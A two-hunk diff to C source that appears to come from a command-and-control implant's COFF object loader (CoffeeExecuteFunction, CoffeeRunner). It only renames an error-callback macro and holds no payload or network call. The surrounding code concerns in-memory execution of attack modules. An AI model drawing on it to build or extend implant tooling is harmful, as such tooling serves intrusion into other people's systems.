@@ -138,7 +138,7 @@ BOOL CoffeeExecuteFunction( PCOFFEE Coffee, PCHAR Function, PVOID Argument, SIZE
         VehHandle = Instance->Win32.RtlAddVectoredExceptionHandler( 1, &VehDebugger );
         if ( ! VehHandle )
         {
-            SEND_WIN32_BACK
+            CALLBACK_GETLASTERROR
             return FALSE;
         }
     }
@@ -435,6 +435,6 @@ VOID CoffeeRunner( PCHAR EntryName, DWORD EntryNameSize, PVOID CoffeeData, SIZE_
     if ( ! ThreadCreate( DX_THREAD_SYSCALL, NtCurrentProcess(), CoffeeRunnerThread, &InjectionCtx ) )
     {
         PRINTF( "Failed to create new CoffeeRunnerThread thread: %d", NtGetLastError() )
-        SEND_WIN32_BACK
+        CALLBACK_GETLASTERROR
     }
 }
